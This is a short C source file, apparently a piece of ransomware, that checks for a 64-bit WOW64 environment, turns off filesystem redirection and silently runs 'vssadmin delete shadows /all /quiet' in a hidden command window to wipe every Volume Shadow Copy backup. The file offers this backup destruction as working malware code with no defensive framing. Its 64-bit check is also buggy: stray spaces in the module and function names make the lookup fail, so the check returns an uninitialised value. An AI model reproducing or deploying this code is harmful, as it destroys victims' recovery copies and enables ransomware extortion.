#include "DeleteBackup.h"
BOOL x64_bit(){
BOOL  state;//retorna um booleano com valor 1 caso o sistema seja de 64 bits.
typedef  BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;
fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleA(" kernel32.dll "), " IsWow64Process ");
if (0 != fnIsWow64Process)
{
	if (!fnIsWow64Process(GetCurrentProcess(), &state))
	{
		state = 0;
	}
}
return(state);//Nao roda numa arquitetura Intel_x64
}









void DeleteShadowCopeis() {
	PVOID oldValue = 0;

	if (x64_bit()) {
		typedef BOOL(WINAPI* fnc)(PVOID*);
		HMODULE lib = LoadLibraryA("kernel32.dll");
		FARPROC addr = GetProcAddress(lib, "Wow64DisableWow64FsRedirection");
		if (addr) ((fnc)addr)(&oldValue);
	}

	ShellExecuteW(0, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", 0, SW_HIDE);

	if (x64_bit()) {
		typedef BOOL(WINAPI* fnc)(PVOID);
		HMODULE lib = LoadLibraryA("kernel32.dll");
		FARPROC addr = GetProcAddress(lib, "Wow64RevertWow64FsRedirection");
		if (addr) ((fnc)addr)(oldValue);
	}









}